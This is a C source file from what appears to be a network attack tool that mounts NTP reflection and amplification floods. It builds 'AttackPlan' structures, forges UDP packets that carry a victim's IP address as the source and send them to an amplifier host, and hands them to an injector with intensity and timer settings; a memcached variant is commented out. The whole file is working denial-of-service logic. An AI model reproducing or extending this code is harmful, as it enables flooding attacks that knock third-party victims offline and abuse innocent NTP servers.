
#include "venus.h"
#include "strix.h"
#include "NTPforge.h"
#include "common/common.h"
#include "common/blacksmith.h"
#include "netuno/netuno.h"

#include "venus.h"
#define NOSIGNAL  0
#define SIGNAL_STOP 1
#define SIGNAL_ERROR 2

#define GetPort( port ) ( port > 0 ) ? port : NTP_DEFAULT_PORT
#define UDPPacketSize( payload_size ) ( IP_HEADER_SIZE + UDP_HEADER_SIZE + payload_size )

void ntpSetValue( AttackPlan * p_atkData )
{
    int sock = CreateSocket(UDP, BLOCK);
    NtpBinaryResponseHeader response;
    ConnectTCP(sock, p_atkData->setPacket);
    for(Packet *tmpPkt = p_atkData->setPacket; tmpPkt != NULL; tmpPkt = tmpPkt->next)
    {
        if( SendPacket(sock, tmpPkt) < 0 )
        {
            Efatal(ERROR_NTP, "error ntp\n");
        }

        recv(sock, &response, sizeof(NtpBinaryResponseHeader), 0);
        
        // if(response.status != 0)
        // {
        //     Efatal(ERROR_NTP, "Error ntp: cannot set data\n");
        // }
    }
    CloseSocket(sock);
}

static AttackPlan * createAttackDataNTP( LhfDraft *p_draft )
{
    AttackPlan *newData;
    int arg;

    memalloc( (void *)&newData, sizeof( AttackPlan ) );
    arg = NTP;
    //newData->setPacket = ForgeTCP( p_draft->amp_ip, GetPort(p_draft->amp_port), ForgeNtpBinary, &arg );
    newData->setPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeNtpBinary, &arg );
    // newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeNtpText, &arg );
    newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeNtpBinary, &arg );
    newData->draft = p_draft;
    return newData;
}

void executeAttackNtp( AttackPlan * atkData )
{
    char *fileName = (atkData->draft->logfile[0] == '\0') ? NULL : atkData->draft->logfile;
    if(atkData->draft->type == NTP)
    {
        ntpSetValue( atkData );
    }
    StartNetunoInjector( atkData->getPacket, atkData->draft->level, atkData->draft->timer, atkData->draft->incAttack, fileName);
}

int  ExecuteNtpMirror( void *p_draft )
{
    AttackPlan *plan;
    LhfDraft *draft = (LhfDraft *)p_draft;
    switch( draft->type )
    {
        case NTP:
        default:
            plan = createAttackDataNTP( draft );
            break;

        // case MEMCACHED_STATS:
        // default:
        //     plan = createAttackDataSTATS( draft );
        //     break;
    }
    executeAttackNtp(plan);
    return 0;
}